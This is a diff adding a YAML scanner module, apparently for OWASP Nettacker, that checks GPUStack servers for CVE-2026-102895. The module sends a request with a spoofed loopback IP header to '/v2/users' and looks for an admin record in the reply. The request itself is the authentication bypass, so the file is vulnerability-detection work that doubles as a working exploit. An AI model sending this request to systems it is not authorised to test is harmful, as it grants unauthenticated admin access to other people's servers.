@@ -1,0 +1,49 @@
+info:
+  name: gpustack_cve_2026_102895_vuln
+  author: atul-upadhyay-7
+  severity: 9.8
+  description: CVE-2026-102895 - GPUStack before v2.2.0 trusts the X-GPUStack-Real-IP header without verification, allowing remote unauthenticated admin access via loopback IP spoofing.
+  reference:
+    - https://github.com/advisories/GHSA-gj9m-f8ph-pmhr
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-102895
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  profiles:
+    - vuln
+    - http
+    - high_severity
+    - cve
+    - cve2026
+    - cisa_kev
+    - gpustack
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+          X-GPUStack-Real-IP: "127.0.0.1"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/v2/users"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 8000
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "\"is_admin\":true"
+              reverse: false
